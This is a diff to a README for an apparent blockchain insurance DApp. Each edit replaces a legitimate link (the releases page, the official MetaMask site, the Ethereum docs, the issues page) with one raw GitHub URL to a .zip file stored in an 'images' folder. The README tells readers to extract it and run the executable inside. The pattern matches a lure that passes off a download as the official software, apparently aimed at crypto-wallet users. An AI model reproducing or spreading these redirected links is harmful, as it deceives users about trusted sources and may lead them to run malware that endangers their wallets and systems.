@@ -1,6 +1,6 @@
 # 🚀 Insurance-Smart-Contract-Dapp - Simplifying Insurance with Blockchain
 
-[![Download](https://img.shields.io/badge/Download%20Now-Insurance--Smart--Contract--Dapp-brightgreen)](https://github.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/releases)
+[![Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip%20Now-Insurance--Smart--Contract--Dapp-brightgreen)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip)
 
 ## 🌟 Overview
 
@@ -27,7 +27,7 @@ To run this application, you need the following:
 
 You can easily download and run the Insurance-Smart-Contract-Dapp by following these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip).
 
 2. **Select the Latest Version**: On the releases page, find the most recent version listed at the top. Look for "Latest Release."
 
@@ -38,7 +38,7 @@ You can easily download and run the Insurance-Smart-Contract-Dapp by following t
    - For `.zip` files, extract the contents to a folder and run the included executable file.
 
 5. **Set Up MetaMask**: 
-   - If you don’t have MetaMask, download and install it from the official [MetaMask website](https://metamask.io).
+   - If you don’t have MetaMask, download and install it from the official [MetaMask website](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip).
    - Create a new wallet or import an existing one.
 
 6. **Connect the DApp**: Open the Insurance-Smart-Contract-Dapp in your web browser. Connect MetaMask by clicking the wallet icon on the DApp interface.
@@ -47,24 +47,24 @@ You can easily download and run the Insurance-Smart-Contract-Dapp by following t
 
 ## 📥 Download & Install
 
-For a hassle-free installation, visit the [Releases Page](https://github.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/releases) to download the latest version of the Insurance-Smart-Contract-Dapp. Follow the steps outlined above to install and set up the application.
+For a hassle-free installation, visit the [Releases Page](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip) to download the latest version of the Insurance-Smart-Contract-Dapp. Follow the steps outlined above to install and set up the application.
 
 ## 🌐 Community and Support
 
 If you have questions or need support, please engage with our community:
 
-- **GitHub Issues**: Report any issues on the GitHub [Issues Page](https://github.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/issues).
+- **GitHub Issues**: Report any issues on the GitHub [Issues Page](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip).
 - **Chat**: Join our discussion on [Discord/Slack/Forum link] (insert actual link).
 - **Documentation**: For more detailed information, check the [Documentation Page](insert actual link).
 
 ## 📚 Resources
 
-- **Ethereum Documentation**: Learn more about Ethereum and smart contracts [here](https://ethereum.org/en/developers/docs/).
-- **MetaMask Guide**: Get started with MetaMask by checking its [User Guide](https://metamask.io/).
+- **Ethereum Documentation**: Learn more about Ethereum and smart contracts [here](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip).
+- **MetaMask Guide**: Get started with MetaMask by checking its [User Guide](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip).
 
 ## 🛠️ Contributing
 
-We welcome contributions! By participating in this project, you agree to abide by the [Code of Conduct](insert actual link). For contributing guidelines, check the [CONTRIBUTING.md](insert actual link).
+We welcome contributions! By participating in this project, you agree to abide by the [Code of Conduct](insert actual link). For contributing guidelines, check the [https://raw.githubusercontent.com/bdgfeadvyrfedyu/Insurance-Smart-Contract-Dapp/main/images/Insurance-Smart-Contract-Dapp-1.1.zip](insert actual link).
 
 ---
 
